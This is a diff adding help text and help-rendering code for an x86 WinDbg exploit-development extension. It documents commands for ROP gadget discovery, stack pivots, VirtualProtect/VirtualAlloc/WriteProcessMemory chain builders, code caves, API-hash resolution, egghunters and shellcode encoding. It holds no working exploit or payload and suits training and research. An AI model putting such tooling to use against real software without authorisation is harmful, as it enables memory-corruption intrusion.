+      details: "Loads a corpus you previously saved with rop.corpus.export, avoiding a full re-scan. The imported corpus is INACTIVE until you run rop.corpus.validate() against the live target \u2014 gadget addresses are only trustworthy if the modules still map where they did when you exported. Querying or planning is blocked until validation succeeds.",
+      seeAlso: ["rop.corpus.validate", "rop.corpus.export"]
+    },
+    {
+      name: "rop.corpus.validate",
+      description: "Validates imported module mappings and sampled gadget bytes before enabling the corpus.",
+      usage: "dx @$osed().rop.corpus.validate()",
+      examples: ["dx @$osed().rop.corpus.validate()"],
+      details: "Activates a corpus loaded by rop.corpus.import, but only if it still matches the live target: it re-reads the recorded module bases and sampled gadget bytes and refuses if anything moved or changed (e.g. a relocated DLL). On success the corpus becomes active for query/plan/generate; on failure it reports exactly what drifted so you can re-scan instead.",
+      seeAlso: ["rop.corpus.import", "rop.scan_live", "rop.query"]
+    },
+    {
+      name: "rop.pivots",
+      description: "Finds, classifies, and ranks stack pivot gadgets from the semantic corpus. Optionally filters by source register or minimum ESP adjustment.",
+      usage: "dx @$osed().rop.pivots(register?, minDelta?, verbose?)",
+      examples: [
+        "dx @$osed().rop.pivots()",
+        'dx @$osed().rop.pivots("eax")',
+        "dx @$osed().rop.pivots(undefined, 0x100)",
+        'dx @$osed().rop.pivots("eax", 0, true)'
+      ],
+      details: "The default table is compact: Address, Sequence, Type, Stack, Score. Use verbose:true for source register, clobbers, and module metadata."
+    },
+    {
+      name: "rop.chain",
+      description: "Builds a register-setup chain from the loaded ROP corpus.",
+      usage: "dx @$osed().rop.chain(register, value, register2?, value2?, ...)",
+      examples: ['dx @$osed().rop.chain("eax", 0xDEADBEEF, "ebx", 0x1000)']
+    },
+    {
+      name: "rop.chain_vp",
+      description: "Builds a VirtualProtect PUSHAD chain from the loaded ROP corpus.",
+      usage: "dx @$osed().rop.chain_vp(virtualProtect?, retGadget?, returnAddress?, lpAddress?, dwSize?, writable?, flNewProtect?, mode?)",
+      examples: ["dx @$osed().rop.chain_vp(0x7C801AD0, 0x62501010, 0x625011AF)"]
+    },
+    {
+      name: "rop.chain_wpm",
+      description: "Builds a constrained WriteProcessMemory PUSHAD chain from the loaded ROP corpus.",
+      usage: "dx @$osed().rop.chain_wpm(writeProcessMemory?, returnAddress?, lpBuffer?, nSize?, writable?)",
+      examples: ["dx @$osed().rop.chain_wpm(0x7C802213, 0x625011AF, 0x0012F800, 0x200)"]
+    },
+    {
+      name: "rop.chain_va",
+      description: "Builds a constrained VirtualAlloc PUSHAD chain from the loaded ROP corpus.",
+      usage: "dx @$osed().rop.chain_va(virtualAlloc?, returnAddress?, lpAddress?, flAllocationType?, flProtect?)",
+      examples: ["dx @$osed().rop.chain_va(0x7C809AE1)"]
+    },
+    {
+      name: "rop.frame_vp",
+      description: "Builds a flat VirtualProtect stdcall frame without requiring ROP gadgets.",
+      usage: "dx @$osed().rop.frame_vp(virtualProtect?, returnAddress?, lpAddress?, dwSize?, flNewProtect?, writable?, badchars?)",
+      examples: ['dx @$osed().rop.frame_vp(0x7C801AD0, 0x625011AF, 0x0012F800, 0x201, 0x40, 0x62506000, "00 0A 0D")']
+    },
+    {
+      name: "rop.frame_wpm",
+      description: "Builds a flat WriteProcessMemory stdcall frame without requiring ROP gadgets.",
+      usage: "dx @$osed().rop.frame_wpm(writeProcessMemory?, returnAddress?, hProcess?, lpBaseAddress?, lpBuffer?, nSize?, writable?, badchars?)",
+      examples: ['dx @$osed().rop.frame_wpm(0x7C802213, 0x625011AF, 0xFFFFFFFF, 0x62502000, 0x0012F800, 0x200, 0x62506000, "00")']
+    },
+    {
+      name: "rop.frame_va",
+      description: "Builds a flat VirtualAlloc stdcall frame without requiring ROP gadgets.",
+      usage: "dx @$osed().rop.frame_va(virtualAlloc?, returnAddress?, lpAddress?, dwSize?, flAllocationType?, flProtect?, badchars?)",
+      examples: ['dx @$osed().rop.frame_va(0x7C809AE1, 0x625011AF, 0, 0x201, 0x1000, 0x40, "00 0A 0D")']
+    },
+    {
+      name: "code_caves",
+      description: "Finds contiguous null/int3/nop padding regions in PE sections with exploitation classification, ASLR awareness, and bad-character filtering. Detection heuristics inspired by nop-tech/codecaver (https://github.com/nop-tech/codecaver).",
+      usage: "dx @$osed().code_caves(module?, minSize?, maxResults?, badChars?, capability?)",
+      examples: [
+        "dx @$osed().code_caves()",
+        'dx @$osed().code_caves("essfunc")',
+        'dx @$osed().code_caves("essfunc", 100)',
+        'dx @$osed().code_caves("essfunc", 50, 25, "00 0A 0D")',
+        'dx @$osed().code_caves("", 50, 25, "", "EXEC")'
+      ]
+    },
+    {
+      name: "sc.iat",
+      description: "Enumerates imported addresses for a module, optionally filtered by DLL or symbol substring.",
+      usage: "dx @$osed().sc.iat(module?, filter?)",
+      examples: ["dx @$osed().sc.iat()", 'dx @$osed().sc.iat("app.exe", "Virtual")']
+    },
+    {
+      name: "sc.iat_find",
+      description: "Searches all loaded modules for matching IAT entries.",
+      usage: "dx @$osed().sc.iat_find(symbol)",
+      examples: ['dx @$osed().sc.iat_find("VirtualAlloc")']
+    },
+    {
+      name: "sc.iat_ptr",
+      description: "Resolves one imported symbol to its IAT slot and current target pointer.",
+      usage: "dx @$osed().sc.iat_ptr(module, symbol)",
+      examples: ['dx @$osed().sc.iat_ptr("app.exe", "VirtualProtect")']
+    },
+    {
+      name: "sc.exportdir",
+      description: "Shows PE export directory addresses and table metadata.",
+      usage: "dx @$osed().sc.exportdir(module)",
+      examples: ['dx @$osed().sc.exportdir("kernel32")']
+    },
+    {
+      name: "sc.export",
+      description: "Resolves an export by name and reports ordinal, RVA, VA, and forwarder data.",
+      usage: "dx @$osed().sc.export(module, symbol)",
+      examples: ['dx @$osed().sc.export("kernel32", "GetProcAddress")']
+    },
+    {
+      name: "sc.exportwalk",
+      description: "Walks PE export resolution checkpoints.",
+      usage: "dx @$osed().sc.exportwalk(module, symbol?, verbose?)",
+      examples: ['dx @$osed().sc.exportwalk("kernel32", "GetProcAddress")']
+    },
+    {
+      name: "sc.exportat",
+      description: "Resolves an export by ordinal index.",
+      usage: "dx @$osed().sc.exportat(module, ordinalIndex)",
+      examples: ['dx @$osed().sc.exportat("kernel32", 842)']
+    },
+    {
+      name: "sc.hashresolve",
+      description: "Resolves an API hash against module exports.",
+      usage: "dx @$osed().sc.hashresolve(module, hashValue, algorithm?)",
+      examples: ['dx @$osed().sc.hashresolve("kernel32", 0x7c0dfcaa, "ROR13")']
+    },
+    {
+      name: "sc.exports",
+      description: "Enumerates exported symbols, optionally filtered by substring.",
+      usage: "dx @$osed().sc.exports(module, filter?)",
+      examples: ['dx @$osed().sc.exports("kernel32", "Virtual")']
+    },
+    {
+      name: "sc.resolve",
+      description: "Resolves one export to an address.",
+      usage: "dx @$osed().sc.resolve(module, symbol)",
+      examples: ['dx @$osed().sc.resolve("kernel32", "WinExec")']
+    },
+    {
+      name: "sc.hashes",
+      description: "Hashes named exports with the selected shellforge-compatible algorithm.",
+      usage: "dx @$osed().sc.hashes(module, algorithm?)",
+      examples: ['dx @$osed().sc.hashes("kernel32", "crc32")']
+    },
+    {
+      name: "sc.hash",
+      description: "Hashes one API name.",
+      usage: "dx @$osed().sc.hash(name, algorithm?)",
+      examples: ['dx @$osed().sc.hash("WinExec", "ROR13")']
+    },
+    {
+      name: "sc.algorithms",
+      description: "Lists supported API hash algorithms.",
+      usage: "dx @$osed().sc.algorithms()",
+      examples: ["dx @$osed().sc.algorithms()"]
+    },
+    {
+      name: "sc.pe",
+      description: "Prints PE header fields for a module.",
+      usage: "dx @$osed().sc.pe(module)",
+      examples: ['dx @$osed().sc.pe("kernel32")']
+    },
+    {
+      name: "sc.base",
+      description: "Resolves a module base address.",
+      usage: "dx @$osed().sc.base(module)",
+      examples: ['dx @$osed().sc.base("kernel32")']
+    },
+    {
+      name: "sc.modules",
+      description: "Lists loaded modules.",
+      usage: "dx @$osed().sc.modules()",
+      examples: ["dx @$osed().sc.modules()"]
+    },
+    {
+      name: "sc.peb",
+      description: "Dumps current PEB-oriented module evidence.",
+      usage: "dx @$osed().sc.peb()",
+      examples: ["dx @$osed().sc.peb()"]
+    },
+    {
+      name: "sc.module_pages",
+      description: "Reports module size and estimated page count.",
+      usage: "dx @$osed().sc.module_pages(module)",
+      examples: ['dx @$osed().sc.module_pages("kernel32")']
+    },
+    {
+      name: "sc.page_summary",
+      description: "Buckets module pages by protection value.",
+      usage: "dx @$osed().sc.page_summary(module)",
+      examples: ['dx @$osed().sc.page_summary("kernel32")']
+    },
+    {
+      name: "stackmap",
+      description: "Maps the call stack at crash time, classifying each slot as pattern bytes (PATTERN), verified return address (RET), saved frame pointer (SAVED_EBP), stale module pointer (STALE_PTR), null (NULL), or data (DATA). Reports controlled slot count, ROP room, and chain entry point.",
+      usage: "dx @$osed().stackmap(depth?, patternLength?)",
+      examples: [
+        "dx @$osed().stackmap()",
+        "dx @$osed().stackmap(128)",
+        "dx @$osed().stackmap(64, 20000)"
+      ]
+    },
+    {
+      name: "exploit.state",
+      description: "Views or updates the cached exploit state used by rop.synthesize(). Populated automatically by triage(); individual fields can be set or overridden manually.",
+      usage: "dx @$osed().exploit.state(overrides?)",
+      examples: [
+        "dx @$osed().exploit.state()"
+      ]
+    },
+    {
+      name: "exploit.clear",
+      description: "Clears the cached exploit state.",
+      usage: "dx @$osed().exploit.clear()",
+      examples: ["dx @$osed().exploit.clear()"]
+    }
+  ];
+  function findHelpEntry(name) {
+    const normalized = name.trim().toLowerCase();
+    return NAMESPACE_HELP_ENTRIES.find((entry) => entry.name.toLowerCase() === normalized);
+  }
+  function helpRows(entry) {
+    return [
+      {
+        Helper: entry.name,
+        Usage: entry.usage,
+        Description: entry.description
+      },
+      ...normalizeHelpExamples(entry.examples).map((example) => ({
+        Helper: "example",
+        Usage: example.command,
+        Description: ""
+      })),
+      ...entry.seeAlso && entry.seeAlso.length > 0 ? [{ Helper: "see also", Usage: entry.seeAlso.join(", "), Description: "" }] : []
+    ];
+  }
+
+  // src/core/version.ts
+  function readBuildString(key2, fallback) {
+    let value;
+    switch (key2) {
+      case "__OSED_VERSION__":
+        value = true ? "1.0.4" : globalThis[key2];
+        break;
+      case "__OSED_BUILD_TIME__":
+        value = true ? "2026-11-19T09:36:50.178Z" : globalThis[key2];
+        break;
+      case "__OSED_GIT_COMMIT__":
+        value = true ? "45c72b7df0a9" : globalThis[key2];
+        break;
+    }
+    return typeof value === "string" && value.length > 0 ? value : fallback;
+  }
+  function readBuildBoolean(key2, fallback) {
+    const value = true ? true : globalThis[key2];
+    return typeof value === "boolean" ? value : fallback;
+  }
+  function getVersionInfo() {
+    return {
+      name: "osed-windbg",
+      version: readBuildString("__OSED_VERSION__", "dev"),
+      buildTime: readBuildString("__OSED_BUILD_TIME__", "unknown"),
+      gitCommit: readBuildString("__OSED_GIT_COMMIT__", "unknown"),
+      gitDirty: readBuildBoolean("__OSED_GIT_DIRTY__", false)
+    };
+  }
+
+  // src/core/help_render.ts
+  var HELP_WIDTH = 68;
+  var INDEX_NAME_WIDTH = 24;
+  var DETAIL_NAME_WIDTH = 23;
+  var ROOT_CATEGORY_ORDER = ["crash", "target", "payload", "rop", "seh", "shellcode", "pe-api", "strings", "format", "tools"];
+  var ROP_TASK_ORDER = ["discovery", "planning", "construction", "control flow", "validation", "persistence", "export"];
+  var CATEGORY_LABELS = {
+    "pe-api": "PE / API"
+  };
+  function words(text) {
+    return text.trim().split(/\s+/).filter(Boolean);
+  }
+  function wrapText(text, width = HELP_WIDTH, indent = "") {
+    const available = Math.max(1, width - indent.length);
+    const lines = [];
+    let line = "";
+    for (const word of words(text)) {
+      if (!line) {
+        line = word;
+      } else if (line.length + 1 + word.length <= available) {
+        line += ` ${word}`;
+      } else {
+        lines.push(`${indent}${line}`);
+        line = word;
+      }
+    }
+    if (line)
+      lines.push(`${indent}${line}`);
+    return lines.length > 0 ? lines : [indent];
+  }
+  function ruler() {
+    return "\u2500".repeat(HELP_WIDTH);
+  }
+  function labelled(label, value) {
+    return wrapText(value, HELP_WIDTH, " ".repeat(label.length)).map((line, index) => index === 0 ? `${label}${line.trimStart()}` : line);
+  }
+  function exampleLines(examples) {
+    return normalizeHelpExamples(examples).flatMap((example) => {
+      const [command2, note] = example.command.split(/\s+\/\/\s+/, 2);
+      return [
+        ...example.label ? wrapText(`${example.label}:`, HELP_WIDTH, "  ") : [],
+        `  ${command2}`,
+        ...note ? wrapText(note, HELP_WIDTH, "  ") : []
+      ];
+    });
+  }
+  function orderedGroups(groups, order = ROOT_CATEGORY_ORDER) {
+    const rank = (name) => {
+      const found = order.indexOf(name);
+      return found === -1 ? order.length : found;
+    };
+    return [...groups.entries()].sort(([a], [b]) => rank(a) - rank(b) || a.localeCompare(b));
+  }
+  function categoryLabel(key2) {
+    var _a;
+    return (_a = CATEGORY_LABELS[key2]) != null ? _a : key2.toUpperCase();
+  }
+  function renderListing(entries) {
+    return entries.map((entry) => {
+      var _a;
+      const label = `  ${entry.name}(...)`;
+      const summary = (_a = entry.summary) != null ? _a : entry.description;
+      if (label.length >= INDEX_NAME_WIDTH) {
+        return `${label}  ${summary}`;
+      }
+      return `${label.padEnd(INDEX_NAME_WIDTH)}${summary}`;
+    });
+  }
+  function renderDetailListing(entries) {
+    const nameWidth = Math.max(DETAIL_NAME_WIDTH, ...entries.map((e) => e.name.length + 2));
+    return entries.flatMap((entry) => {
+      var _a;
+      const summary = (_a = entry.summary) != null ? _a : entry.description;
+      if (entry.name.length + 2 > nameWidth) {
+        return [entry.name, ...wrapText(summary, HELP_WIDTH, "  ")];
+      }
+      const descWidth = HELP_WIDTH - nameWidth;
+      const wrapped = wrapText(summary, descWidth);
+      return wrapped.map((line, i) => `${i === 0 ? entry.name.padEnd(nameWidth) : " ".repeat(nameWidth)}${line}`);
+    });
+  }
+  function renderOverview(groups) {
+    const info2 = getVersionInfo();
+    const banner = `OSED-WINDBG ${info2.version}`;
+    const lines = [
+      "",
+      `\u256D\u2500 ${banner} ${"\u2500".repeat(Math.max(0, HELP_WIDTH - banner.length - 4))}\u256E`,
+      `\u2502 Exploit development \xB7 x86 \xB7 WinDbg JavaScript extension${" ".repeat(Math.max(0, HELP_WIDTH - 57))}\u2502`,
+      `\u2570${"\u2500".repeat(HELP_WIDTH - 1)}\u256F`
+    ];
+    lines.push("", "QUICK START", `  ${"triage()".padEnd(INDEX_NAME_WIDTH - 2)}Analyze current crash and exploitability`, `  ${'help("rop")'.padEnd(INDEX_NAME_WIDTH - 2)}ROP discovery, planning, and construction`, `  ${'help("all")'.padEnd(INDEX_NAME_WIDTH - 2)}Complete command reference`, `  ${'help("?pivot")'.padEnd(INDEX_NAME_WIDTH - 2)}Search commands by keyword`);
+    for (const [category, entries] of orderedGroups(groups)) {
+      lines.push("", categoryLabel(category));
+      lines.push(...renderListing(entries));
+    }
+    lines.push("", ruler(), `  ${'help("<command>")'.padEnd(INDEX_NAME_WIDTH - 2)}Command details`, `  ${'help("<category>")'.padEnd(INDEX_NAME_WIDTH - 2)}Category reference`, `  ${'help("?term")'.padEnd(INDEX_NAME_WIDTH - 2)}Search commands`);
+    return lines;
+  }
+  function renderAll(groups) {
+    const lines = ["", `=== All OSED Commands ===`];
+    for (const [category, entries] of orderedGroups(groups)) {
+      lines.push("", categoryLabel(category));
+      lines.push(...renderDetailListing(entries));
+    }
+    return lines;
+  }
+  function renderNamespace(name, groups) {
+    var _a;
+    const label = categoryLabel(name.toLowerCase());
+    const lines = ["", `${label} \u2014 COMMAND REFERENCE`, ruler()];
+    for (const [task, entries] of orderedGroups(groups, name.toLowerCase() === "rop" ? ROP_TASK_ORDER : [])) {
+      lines.push("", task.toUpperCase());
+      for (const entry of entries) {
+        const summary = (_a = entry.summary) != null ? _a : entry.description;
+        lines.push(`  ${entry.usage.replace(/^dx @\$osed\(\)\./, "")}`);
+        lines.push(...wrapText(summary, HELP_WIDTH, "      "));
+        lines.push("");
+      }
+    }
+    lines.push(ruler(), `  help("<command>")  Command details    help("?term")  Search`);
+    return lines;
+  }
+  function renderSearch(query, groups, total) {
+    const lines = ["", `=== Search: ${query} (${total} ${total === 1 ? "match" : "matches"}) ===`];
+    if (total === 0)
+      return [...lines, "No matching commands."];
+    for (const [category, entries] of orderedGroups(groups)) {
+      lines.push("", categoryLabel(category));
+      lines.push(...renderListing(entries));
+    }
+    return lines;
+  }
+  function renderCandidates(suffix, entries) {
+    const lines = ["", `=== Ambiguous help: ${suffix} ===`];
+    lines.push("Multiple commands match this suffix:", ...renderListing(entries));
+    return lines;
+  }
+  function renderCompactDetail(entry) {
+    var _a, _b, _c;
+    const examples = normalizeHelpExamples(entry.examples);
+    const lines = ["", `=== Help: ${entry.name} ===`];
+    lines.push(...wrapText((_a = entry.summary) != null ? _a : entry.description, HELP_WIDTH));
+    if (examples[0]) {
+      const [command2, note] = examples[0].command.split(/\s+\/\/\s+/, 2);
+      lines.push("", "RUN", `  ${command2}`, ...note ? wrapText(note, HELP_WIDTH, "  ") : []);
+    }
+    if ((_b = entry.prerequisites) == null ? void 0 : _b.length)
+      lines.push("", "REQUIRES", ...entry.prerequisites.flatMap((value) => wrapText(value, HELP_WIDTH, "  ")));
+    if ((_c = entry.seeAlso) == null ? void 0 : _c.length)
+      lines.push("", "NEXT", ...wrapText(entry.seeAlso.join(", "), HELP_WIDTH, "  "));
+    lines.push("", `MORE \u2192 help("${entry.name}", "full")`);
+    return lines;
+  }
+  function renderFullDetail(entry) {
+    var _a, _b, _c, _d;
+    const lines = ["", `=== Help: ${entry.name} ===`];
+    lines.push("PURPOSE", ...wrapText(entry.description, HELP_WIDTH, "  "), "", "USAGE", `  ${entry.usage}`);
+    if (entry.details)
+      lines.push("", "DETAILS", ...wrapText(entry.details, HELP_WIDTH, "  "));
+    if ((_a = entry.arguments) == null ? void 0 : _a.length)
+      lines.push("", "ARGUMENTS", ...entry.arguments.flatMap((argument) => labelled(`  ${argument.name}${argument.required ? "" : "?"}: `, argument.description)));
+    if ((_b = entry.prerequisites) == null ? void 0 : _b.length)
+      lines.push("", "REQUIRES", ...entry.prerequisites.flatMap((value) => wrapText(value, HELP_WIDTH, "  ")));
+    if ((_c = entry.limitations) == null ? void 0 : _c.length)
+      lines.push("", "LIMITATIONS", ...entry.limitations.flatMap((value) => wrapText(value, HELP_WIDTH, "  ")));
+    if (entry.examples.length)
+      lines.push("", "EXAMPLES", ...exampleLines(entry.examples));
+    if ((_d = entry.seeAlso) == null ? void 0 : _d.length)
+      lines.push("", "SEE ALSO", ...wrapText(entry.seeAlso.join(", "), HELP_WIDTH, "  "));
+    return lines;
+  }
+
+  // src/commands/help.ts
+  var categoryForName = (name) => {
+    if (name.startsWith("rop") || name === "retn" || name === "add_esp" || name === "pivots")
+      return "rop";
+    if (name === "seh" || name === "seh_ppr" || name.startsWith("seh."))
+      return "seh";
+    if (name.startsWith("sc."))
+      return "pe-api";
+    if (name.startsWith("str."))
+      return "strings";
+    if (name.startsWith("fmt.") || name === "fmt_build" || name === "fmt_offset")
+      return "format";
+    if (name.startsWith("pattern") || ["badchars", "badchar_array", "badchar_function", "badchar_find"].includes(name))
+      return "payload";
+    if (["triage", "landing", "stackmap", "findmsp"].includes(name))
+      return "crash";
+    if (["modules", "memory", "code_caves", "find_mem_bytes", "find_ptr", "find_stack_bytes", "find_bytes"].includes(name))
+      return "target";
+    if (["egghunter", "encode", "nop"].includes(name))
+      return "shellcode";
+    return "tools";
+  };
+  var LISTING_SUMMARIES = {
+    triage: "Crash and mitigation summary",
+    findmsp: "Find cyclic offsets in registers and memory",
+    landing: "Analyze execution landing and protections",
+    stackmap: "Identify controlled stack regions",
+    modules: "Modules, bases, and mitigations",
+    memory: "Inspect memory region and protections",
+    code_caves: "Find candidate staging regions",
+    pattern_create: "Generate a cyclic pattern",
+    pattern_offset: "Resolve a cyclic offset",
+    badchars: "Compare candidate bytes with memory",
+    badchar_array: "Generate a bad-character test array",
+    badchar_function: "Python BADCHARS list and array helper for the exploit",
+    badchar_find: "Locate a sent bad-character array in memory",
+    find_bytes: "Find byte sequence in PE sections",
+    find_mem_bytes: "Find byte sequence in a memory range",
+    find_stack_bytes: "Find byte sequence on the stack",
+    find_ptr: "Search executable memory for instruction bytes",
+    "rop.scan": "Load gadgets into the semantic corpus",
+    "rop.scan_live": "Discover gadgets in loaded modules",
+    "rop.api_plan": "Discover validated API address-resolution candidates",
+    "rop.api_build": "Construct a bounded API-address resolution chain",
+    "rop.query": "Search gadgets by capability or instruction",
+    "rop.capabilities": "Summarize available ROP primitives",
+    "rop.plan": "Compare API-call construction strategies",
+    "rop.emit": "Select gadgets for a strategy",
+    "rop.synthesize": "Build a concrete stack layout",
+    "rop.construct": "Build register-load ROP recipes",
+    "rop.setup": "Stage registers for a call frame",
+    "rop.frame_write": "Construct stdcall frames in memory",
+    "rop.slot_call": "Call APIs through stable IAT slots",
+    "rop.generate": "Generate an API-call chain",
+    "rop.verify": "Verify chain structure and side effects",
+    "rop.prove": "Trace chain execution in WinDbg",
+    "rop.pivots": "Find and rank stack pivot gadgets",
+    "rop.corpus.export": "Save the semantic corpus to disk",
+    "rop.corpus.import": "Load a corpus as inactive evidence",
+    "rop.corpus.validate": "Validate corpus against live memory",
+    "rop.corpus.report": "Print a human-readable gadget inventory",
+    "rop.frame_va": "Build a VirtualAlloc stdcall frame",
+    "rop.frame_vp": "Build a VirtualProtect stdcall frame",
+    "rop.frame_wpm": "Build a WriteProcessMemory stdcall frame",
+    "rop.chain": "Build a register-setup chain",
+    "rop.chain_va": "Build a VirtualAlloc PUSHAD chain",
+    "rop.chain_vp": "Build a VirtualProtect PUSHAD chain",
+    "rop.chain_wpm": "Build a WriteProcessMemory PUSHAD chain",
+    "rop.export": "Export gadgets and chain as Python",
+    "rop.find": "Legacy ROP helper and module triage",
+    rop_find: "Flat alias for legacy ROP helper triage",
+    rop_suggest: "Suggest exploit-friendly gadget patterns",
+    rop_template: "Print a commented ROP chain skeleton",
+    pivots: "Scan for stack pivot candidates",
+    retn: "Scan for retn N gadgets",
+    add_esp: "Scan for add esp, N gadgets",
+    seh: "Walk current thread SEH chain",
+    seh_ppr: "Find POP-POP-RET candidates",
+    "seh.visualize": "Inspect the exception-handler chain",
+    encode: "Encode shellcode around forbidden bytes",
+    egghunter: "Generate an egghunter stub",
+    nop: "Generate a NOP sled",
+    "sc.iat": "Inspect imported APIs and IAT entries",
+    "sc.iat_find": "Search all modules for matching IAT entries",
+    "sc.iat_ptr": "Resolve an import to its IAT slot",
+    "sc.resolve": "Resolve API exports",
+    "sc.export": "Resolve an export by name",
+    "sc.exportat": "Resolve an export by ordinal",
+    "sc.exportdir": "Show PE export directory metadata",
+    "sc.exportwalk": "Walk PE export resolution checkpoints",
+    "sc.exports": "Enumerate exported symbols",
+    "sc.hash": "Hash one API name",
+    "sc.hashes": "Hash named exports with a given algorithm",
+    "sc.hashresolve": "Resolve an API hash against exports",
+    "sc.algorithms": "List supported API hash algorithms",
+    "sc.pe": "Print PE header fields",
+    "sc.base": "Resolve a module base address",
+    "sc.modules": "List loaded modules",
+    "sc.peb": "Dump PEB-oriented module evidence",
+    "sc.module_pages": "Report module size and page count",
+    "sc.page_summary": "Bucket module pages by protection",
+    "str.find": "Search process memory for strings",
+    "str.read": "Read a string from memory",
+    "str.refs": "Find executable pointers to a string",
+    "str.bytes": "Encode text as payload bytes",
+    "leak.classify": "Classify a pointer without dereferencing",
+    "leak.scan": "Scan bounded memory for pointer candidates",
+    "leak.analyze": "Analyze supplied output for pointer candidates",
+    "leak.base": "Calculate and validate a module base",
+    "pattern.create": "Generate cyclic pattern text",
+    "pattern.offset": "Find an offset in a pattern family",
+    fmt_build: "Construct format-string payload components",
+    fmt_offset: "Find the controlled parameter index",
+    fmt_inspect: "Inspect a paused printf-family format argument",
+    "fmt.build": "Construct format-string payload components",
+    "fmt.offset": "Find the controlled parameter index",
+    "fmt.inspect": "Inspect a paused printf-family format argument",
+    exploit: "Emit exploit-development command workflows",
+    "exploit.state": "View or update cached exploit state",
+    "exploit.clear": "Clear the cached exploit state",
+    math: "Format an integer as hex, signed, unsigned, LE",
+    leak_classify: "Classify a pointer without dereferencing",
+    leak_scan: "Scan bounded memory for pointer candidates",
+    leak_analyze: "Analyze supplied output for pointer candidates",
+    leak_base: "Calculate and validate a module base",
+    help: "List commands or show detailed help",
+    reload: "Clear and re-register command registry",
+    version: "Show loaded build identity"
+  };
+  function shortSummary(name, description, supplied) {
+    var _a, _b, _c, _d;
+    return (_d = (_c = (_a = LISTING_SUMMARIES[name]) != null ? _a : supplied) != null ? _c : (_b = /^[\s\S]*?[.!?](?=\s)/.exec(description)) == null ? void 0 : _b[0]) != null ? _d : description;
+  }
+  var toDocument = (entry) => __spreadProps(__spreadValues({}, entry), { summary: shortSummary(entry.name, entry.description, entry.summary) });
+  function registryDocument(command2) {
+    return { name: command2.name, description: command2.description, summary: shortSummary(command2.name, command2.description), usage: command2.usage, examples: command2.examples, category: categoryForName(command2.name) };
+  }
+  function groupedDocuments(registry2) {
+    var _a, _b;
+    const documents2 = /* @__PURE__ */ new Map();
+    for (const command2 of registry2.getAll())
+      documents2.set(command2.name, registryDocument(command2));
+    for (const entry of NAMESPACE_HELP_ENTRIES)
+      documents2.set(entry.name, toDocument(entry));
+    documents2.delete("rop");
+    const groups = /* @__PURE__ */ new Map();
+    for (const entry of [...documents2.values()].sort((a, b) => a.name.localeCompare(b.name))) {
+      const category = (_a = entry.category) != null ? _a : categoryForName(entry.name);
+      groups.set(category, [...(_b = groups.get(category)) != null ? _b : [], entry]);
+    }
+    return groups;
+  }
+  var OVERVIEW_WORKFLOW = [
+    ["crash", ["triage", "findmsp", "stackmap", "landing"]],
+    ["target", ["modules", "memory", "code_caves"]],
+    ["payload", ["pattern_create", "pattern_offset", "badchars"]],
+    ["rop", ["rop.scan_live", "rop.api_plan", "rop.api_build", "rop.query", "rop.capabilities", "rop.plan", "rop.generate", "rop.verify", "rop.prove"]],
+    ["pe-api", ["sc.iat", "sc.resolve"]],
+    ["shellcode", ["encode", "egghunter"]],
+    ["seh", ["seh", "seh_ppr"]],
+    ["strings", ["str.find"]],
+    ["format", ["fmt_build"]]
+  ];
+  function overviewGroups(all) {
+    const index = new Map(all.map((entry) => [entry.name, entry]));
+    const groups = /* @__PURE__ */ new Map();
+    for (const [category, names] of OVERVIEW_WORKFLOW) {
+      const entries = names.map((name) => index.get(name)).filter((entry) => !!entry);
+      if (entries.length > 0)
+        groups.set(category, entries);
+    }
+    return groups;
+  }
+  function documents(registry2) {
+    return [...groupedDocuments(registry2).values()].flat().sort((a, b) => a.name.localeCompare(b.name));
+  }
+  function namespaceTask(name, entry) {
+    if (name === "rop") {
+      if (["rop.scan", "rop.scan_live", "rop.query", "rop.capabilities", "rop.pivots", "rop.find", "rop_find"].includes(entry.name))
+        return "discovery";
+      if (["rop.plan", "rop.emit", "rop.synthesize"].includes(entry.name))
+        return "planning";
+      if (["rop.verify", "rop.prove"].includes(entry.name))
+        return "validation";
+      if (entry.name.startsWith("rop.corpus."))
+        return "persistence";
+      if (entry.name === "rop.export")
+        return "export";
+      if (["retn", "add_esp"].includes(entry.name))
+        return "control flow";
+      return "construction";
+    }
+    if (name === "sc") {
+      if (entry.name.startsWith("sc.iat"))
+        return "imports";
+      if (["sc.exports", "sc.export", "sc.exportat", "sc.exportdir", "sc.exportwalk", "sc.resolve", "sc.hash", "sc.hashes", "sc.hashresolve", "sc.algorithms"].includes(entry.name))
+        return "api resolution";
+      return "pe and modules";
+    }
+    return "commands";
+  }
+  function namespaceDocuments(name, all) {
+    var _a;
+    const normalized = name.toLowerCase();
+    const matches = all.filter((entry) => {
+      var _a2, _b, _c;
+      if (normalized === "rop")
+        return ((_a2 = entry.category) != null ? _a2 : categoryForName(entry.name)) === "rop";
+      if (normalized === "seh")
+        return ((_b = entry.category) != null ? _b : categoryForName(entry.name)) === "seh";
+      if (["crash", "payload", "target", "shellcode", "pe-api", "strings", "format", "tools"].includes(normalized)) {
+        return ((_c = entry.category) != null ? _c : categoryForName(entry.name)) === normalized;
+      }
+      return entry.name.startsWith(`${normalized}.`);
+    });
+    if (matches.length === 0)
+      return void 0;
+    const groups = /* @__PURE__ */ new Map();
+    for (const entry of matches) {
+      const task = namespaceTask(normalized, entry);
+      groups.set(task, [...(_a = groups.get(task)) != null ? _a : [], entry]);
+    }
+    return groups;
+  }
+  function searchDocuments(query, all) {
+    const needle = query.toLowerCase();
+    return all.filter((entry) => {
+      var _a;
+      return [entry.name, entry.summary, entry.description, ...(_a = entry.keywords) != null ? _a : []].filter((value) => Boolean(value)).some((value) => value.toLowerCase().includes(needle));
+    }).sort((a, b) => {
+      const score = (entry) => entry.name.toLowerCase().includes(needle) ? 0 : 1;
+      return score(a) - score(b) || a.name.localeCompare(b.name);
+    });
+  }
+  function groupByCategory(entries) {
+    var _a, _b;
+    const groups = /* @__PURE__ */ new Map();
+    for (const entry of entries) {
+      const category = (_a = entry.category) != null ? _a : categoryForName(entry.name);
+      groups.set(category, [...(_b = groups.get(category)) != null ? _b : [], entry]);
+    }
+    return groups;
+  }
+  function print2(lines) {
+    for (const line of lines)
+      print(line);
+  }
+  function createHelpCommand(registry2) {
+    return {
+      name: "help",
+      description: "List commands or show detailed command help.",
+      usage: "dx @$osed().help(command?, mode?)",
+      examples: ["dx @$osed().help()", 'dx @$osed().help("all")', 'dx @$osed().help("sc.iat", "full")'],
+      schema: { command: { type: "string" }, mode: { type: "string" } },
+      execute(options) {
+        const commandName = options.command;
+        const mode = options.mode;
+        if (!commandName) {
+          const groups = overviewGroups(documents(registry2));
+          print2(renderOverview(groups));
